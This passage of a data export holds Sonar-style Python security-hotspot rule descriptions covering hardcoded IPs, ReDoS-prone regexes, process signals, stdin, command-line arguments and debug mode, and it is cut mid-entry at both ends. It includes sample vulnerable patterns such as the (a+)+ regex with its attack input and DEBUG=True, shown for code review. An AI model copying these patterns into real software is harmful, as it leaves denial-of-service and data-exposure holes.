  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ip = '192.168.12.42'
sock = socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Compliant Solution</h2>
<pre>
ip = config.get(section, ipAddress)
sock = socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=""http://www.oid-info.com/introduction.htm"">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",Using hardcoded IP addresses is security-sensitive,[],MINOR,['cert'],SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<p>Django</p>
<pre>
from django.core.validators import RegexValidator
from django.urls import re_path

def build_validator(regex):
    RegexValidator(regex)  # Questionable

RegexValidator('(a*)*')  # Questionable

def define_http_endpoint(path, view):
    re_path(path, view)  # Questionable
</pre>
<p><code>re</code> module</p>
<pre>
import re
from re import compile, match, search, fullmatch, split, findall, finditer, sub, subn


input = 'input string'
replacement = 'replacement'

re.compile  # Questionable
re.match  # Questionable
re.search  # Questionable
re.fullmatch  # Questionable
re.split  # Questionable
re.findall  # Questionable
re.finditer  # Questionable
re.sub  # Questionable
re.subn  # Questionable

compile  # Questionable
match  # Questionable
search  # Questionable
fullmatch  # Questionable
split  # Questionable
findall  # Questionable
finditer  # Questionable
sub  # Questionable
subn  # Questionable

def dynamic_pattern(pattern):
    re.compile(pattern)  # Questionable
    re.match(pattern, input)  # Questionable
    re.search(pattern, input)  # Questionable
    re.fullmatch(pattern, input)  # Questionable
    re.split(pattern, input)  # Questionable
    re.findall(pattern, input)  # Questionable
    re.finditer(pattern,input)  # Questionable
    re.sub(pattern, replacement, input)  # Questionable
    re.subn(pattern, replacement, input)  # Questionable
</pre>
<p><code>regex</code> module</p>
<pre>
import regex
from regex import compile, match, search, fullmatch, split, findall, finditer, sub, subn, subf, subfn, splititer

input = 'input string'
replacement = 'replacement'

regex.subf  # Questionable
regex.subfn  # Questionable
regex.splititer  # Questionable

subf  # Questionable
subfn  # Questionable
splititer  # Questionable

def dynamic_pattern(pattern):
    regex.subf(pattern, replacement, input)  # Questionable
    regex.subfn(pattern, replacement, input)  # Questionable
    regex.splititer(pattern, input)  # Questionable

regex.compile  # Questionable
regex.match  # Questionable
regex.search  # Questionable
regex.fullmatch  # Questionable
regex.split  # Questionable
regex.findall  # Questionable
regex.finditer  # Questionable
regex.sub  # Questionable
regex.subn  # Questionable

compile  # Questionable
match  # Questionable
search  # Questionable
fullmatch  # Questionable
split  # Questionable
findall  # Questionable
finditer  # Questionable
sub  # Questionable
subn  # Questionable

def dynamic_pattern(pattern):
    regex.compile(pattern)  # Questionable
    regex.match(pattern, input)  # Questionable
    regex.search(pattern, input)  # Questionable
    regex.fullmatch(pattern, input)  # Questionable
    regex.split(pattern, input)  # Questionable
    regex.findall(pattern, input)  # Questionable
    regex.finditer(pattern,input)  # Questionable
    regex.sub(pattern, replacement, input)  # Questionable
    regex.subn(pattern, replacement, input)  # Questionable

</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",python:S4784,py,Python,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<p>Django</p>
<pre>
from django.core.validators import RegexValidator
from django.urls import re_path

def build_validator(regex):
    RegexValidator(regex)  # Questionable

RegexValidator('(a*)*')  # Questionable

def define_http_endpoint(path, view):
    re_path(path, view)  # Questionable
</pre>
<p><code>re</code> module</p>
<pre>
import re
from re import compile, match, search, fullmatch, split, findall, finditer, sub, subn


input = 'input string'
replacement = 'replacement'

re.compile  # Questionable
re.match  # Questionable
re.search  # Questionable
re.fullmatch  # Questionable
re.split  # Questionable
re.findall  # Questionable
re.finditer  # Questionable
re.sub  # Questionable
re.subn  # Questionable

compile  # Questionable
match  # Questionable
search  # Questionable
fullmatch  # Questionable
split  # Questionable
findall  # Questionable
finditer  # Questionable
sub  # Questionable
subn  # Questionable

def dynamic_pattern(pattern):
    re.compile(pattern)  # Questionable
    re.match(pattern, input)  # Questionable
    re.search(pattern, input)  # Questionable
    re.fullmatch(pattern, input)  # Questionable
    re.split(pattern, input)  # Questionable
    re.findall(pattern, input)  # Questionable
    re.finditer(pattern,input)  # Questionable
    re.sub(pattern, replacement, input)  # Questionable
    re.subn(pattern, replacement, input)  # Questionable
</pre>
<p><code>regex</code> module</p>
<pre>
import regex
from regex import compile, match, search, fullmatch, split, findall, finditer, sub, subn, subf, subfn, splititer

input = 'input string'
replacement = 'replacement'

regex.subf  # Questionable
regex.subfn  # Questionable
regex.splititer  # Questionable

subf  # Questionable
subfn  # Questionable
splititer  # Questionable

def dynamic_pattern(pattern):
    regex.subf(pattern, replacement, input)  # Questionable
    regex.subfn(pattern, replacement, input)  # Questionable
    regex.splititer(pattern, input)  # Questionable

regex.compile  # Questionable
regex.match  # Questionable
regex.search  # Questionable
regex.fullmatch  # Questionable
regex.split  # Questionable
regex.findall  # Questionable
regex.finditer  # Questionable
regex.sub  # Questionable
regex.subn  # Questionable

compile  # Questionable
match  # Questionable
search  # Questionable
fullmatch  # Questionable
split  # Questionable
findall  # Questionable
finditer  # Questionable
sub  # Questionable
subn  # Questionable

def dynamic_pattern(pattern):
    regex.compile(pattern)  # Questionable
    regex.match(pattern, input)  # Questionable
    regex.search(pattern, input)  # Questionable
    regex.fullmatch(pattern, input)  # Questionable
    regex.split(pattern, input)  # Questionable
    regex.findall(pattern, input)  # Questionable
    regex.finditer(pattern,input)  # Questionable
    regex.sub(pattern, replacement, input)  # Questionable
    regex.subn(pattern, replacement, input)  # Questionable

</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using regular expressions is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Signalling processes is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<p> * <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0390"">CVE-2009-0390</a></p>
<p> * <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0839"">CVE-2002-0839</a></p>
<p> * <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1671"">CVE-2008-1671</a></p>
<p>Sending signals without checking properly which process will receive it can cause a denial of service.</p>
<h2>Ask Yourself Whether</h2>
<p> * the PID of the process to which the signal will be sent is coming from an untrusted source. It could for example come from a world-writable
file.</p>
<p> * users who are asking for the signal to be sent might not have the permission to send those signals.</p>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p> * If the signal is sent because of a user's request. Check that the user is allowed to send this signal. You can for example forbid it if the user
doesn't own the process.</p>
<p> * Secure the source from which the process PID is read.</p>
<p> * Run the process sending the signals with minimal permissions.</p>
<h2>Questionable Code Example</h2>
<pre>
import os

def send_signal(pid, sig, pgid):
    os.kill(pid, sig)  # Questionable
    os.killpg(pgid, sig)  # Questionable
</pre>
<h2>See</h2>
<p> * <a href=""https://cwe.mitre.org/data/definitions/283.html"">MITRE, CWE-283</a> - Unverified Ownership</p>",python:S4828,py,Python,"<p>Signalling processes is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<p> * <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0390"">CVE-2009-0390</a></p>
<p> * <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0839"">CVE-2002-0839</a></p>
<p> * <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1671"">CVE-2008-1671</a></p>
<p>Sending signals without checking properly which process will receive it can cause a denial of service.</p>
<h2>Ask Yourself Whether</h2>
<p> * the PID of the process to which the signal will be sent is coming from an untrusted source. It could for example come from a world-writable
file.</p>
<p> * users who are asking for the signal to be sent might not have the permission to send those signals.</p>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p> * If the signal is sent because of a user's request. Check that the user is allowed to send this signal. You can for example forbid it if the user
doesn't own the process.</p>
<p> * Secure the source from which the process PID is read.</p>
<p> * Run the process sending the signals with minimal permissions.</p>
<h2>Questionable Code Example</h2>
<pre>
import os

def send_signal(pid, sig, pgid):
    os.kill(pid, sig)  # Questionable
    os.killpg(pgid, sig)  # Questionable
</pre>
<h2>See</h2>
<p> * <a href=""https://cwe.mitre.org/data/definitions/283.html"">MITRE, CWE-283</a> - Unverified Ownership</p>",Signalling processes is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Python 2 and Python 3</p>
<pre>
import sys
from sys import stdin, __stdin__

# Any reference to sys.stdin or sys.__stdin__ without a method call is Questionable
sys.stdin  # Questionable

for line in sys.stdin:  # Questionable
    print(line)

it = iter(sys.stdin)  # Questionable
line = next(it)

# Calling the following methods on stdin or __stdin__ is questionable
sys.stdin.read()  # Questionable
sys.stdin.readline()  # Questionable
sys.stdin.readlines()  # Questionable

# Calling other methods on stdin or __stdin__ does not require a review, thus it is not Questionable
sys.stdin.seekable()  # Ok
# ...
</pre>
<p>Python 2 only</p>
<pre>
raw_input('What is your password?')  # Questionable
</pre>
<p>Python 3 only</p>
<pre>
input('What is your password?')  # Questionable
</pre>
<p>Function <code>fileinput.input</code> and class <code>fileinput.FileInput</code> read the standard input when the list of files is empty.</p>
<pre>
for line in fileinput.input():  # Questionable
    print(line)

for line in fileinput.FileInput():  # Questionable
    print(line)

for line in fileinput.input(['setup.py']):  # Ok
    print(line)

for line in fileinput.FileInput(['setup.py']):  # Ok
    print(line)
</pre>",python:S4829,py,Python,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Python 2 and Python 3</p>
<pre>
import sys
from sys import stdin, __stdin__

# Any reference to sys.stdin or sys.__stdin__ without a method call is Questionable
sys.stdin  # Questionable

for line in sys.stdin:  # Questionable
    print(line)

it = iter(sys.stdin)  # Questionable
line = next(it)

# Calling the following methods on stdin or __stdin__ is questionable
sys.stdin.read()  # Questionable
sys.stdin.readline()  # Questionable
sys.stdin.readlines()  # Questionable

# Calling other methods on stdin or __stdin__ does not require a review, thus it is not Questionable
sys.stdin.seekable()  # Ok
# ...
</pre>
<p>Python 2 only</p>
<pre>
raw_input('What is your password?')  # Questionable
</pre>
<p>Python 3 only</p>
<pre>
input('What is your password?')  # Questionable
</pre>
<p>Function <code>fileinput.input</code> and class <code>fileinput.FileInput</code> read the standard input when the list of files is empty.</p>
<pre>
for line in fileinput.input():  # Questionable
    print(line)

for line in fileinput.FileInput():  # Questionable
    print(line)

for line in fileinput.input(['setup.py']):  # Ok
    print(line)

for line in fileinput.FileInput(['setup.py']):  # Ok
    print(line)
</pre>",Reading the Standard Input is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue on every reference to <code>sys.argv</code>, call to <code>optparse.OptionParser()</code> or a call to
<code>argparse.ArgumentParser()</code>. The goal is to guide security code reviews.</p>",python:S4823,py,Python,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue on every reference to <code>sys.argv</code>, call to <code>optparse.OptionParser()</code> or a call to
<code>argparse.ArgumentParser()</code>. The goal is to guide security code reviews.</p>",Using command line arguments is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-insecure']",SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The application should run by default in the most secure mode, i.e. as on production servers. This is to prevent any mistake. Enabling debug
features should be explicitly asked via a command line argument, an environment variable or a configuration file.</p>
<p>Check that every debug feature is controlled by only very few configuration variables: logging, exception/error handling, access control, etc... It
is otherwise very easy to forget one of them.</p>
<p>Do not enable debug features on production servers.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Django</p>
<pre>
from django.conf import settings

settings.configure(DEBUG=True)  # Questionable when set to True
settings.configure(DEBUG_PROPAGATE_EXCEPTIONS=True)  # Questionable when set to True

def custom_config(config):
    settings.configure(default_settings=config, DEBUG=True)  # Questionable
</pre>
<p>Django's ""global_settings.py"" configuration file</p>
<pre>
# NOTE: The following code raises issues only if the file is named ""global_settings.py"". This is the default
# name of Django configuration file

DEBUG = True  # Questionable
DEBUG_PROPAGATE_EXCEPTIONS = True  # Questionable
</pre>",python:S4507,py,Python,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The application should run by default in the most secure mode, i.e. as on production servers. This is to prevent any mistake. Enabling debug
features should be explicitly asked via a command line argument, an environment variable or a configuration file.</p>
<p>Check that every debug feature is controlled by only very few configuration variables: logging, exception/error handling, access control, etc... It
is otherwise very easy to forget one of them.</p>
<p>Do not enable debug features on production servers.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Django</p>
<pre>
from django.conf import settings

settings.configure(DEBUG=True)  # Questionable when set to True
settings.configure(DEBUG_PROPAGATE_EXCEPTIONS=True)  # Questionable when set to True

def custom_config(config):
    settings.configure(default_settings=config, DEBUG=True)  # Questionable
</pre>
<p>Django's ""global_settings.py"" configuration file</p>
<pre>
# NOTE: The following code raises issues only if the file is named ""global_settings.py"". This is the default
# name of Django configuration file

DEBUG = True  # Questionable
DEBUG_PROPAGATE_EXCEPTIONS = True  # Questionable
</pre>",Delivering code in production with debug features activated is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3']",SECURITY_HOTSPOT
2015-04-07T09:32:26+0200,"<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, and <code>raise</code>) move control flow out of the current code
block. So any statements that come after a jump are dead code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def fun(a):
  i = 10
  return i + a       # Noncompliant
  i += 1             # this is never executed
</pre>
<h2>Compliant Solution</h2>
<pre>
def fun(a):
  i = 10
  return i + a
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",python:S1763,py,Python,"<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, and <code>raise</code>) move control flow out of the current code
block. So any statements that come after a jump are dead code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def fun(a):
  i = 10
  return i + a       # Noncompliant
  i += 1             # this is never executed
</pre>
<h2>Compliant Solution</h2>
<pre>
def fun(a):
  i = 10
  return i + a
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Jump statements should not be followed by dead code,[],MAJOR,"['cert', 'cwe', 'misra', 'unused']",BUG
2019-03-14T10:00:54+0100,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
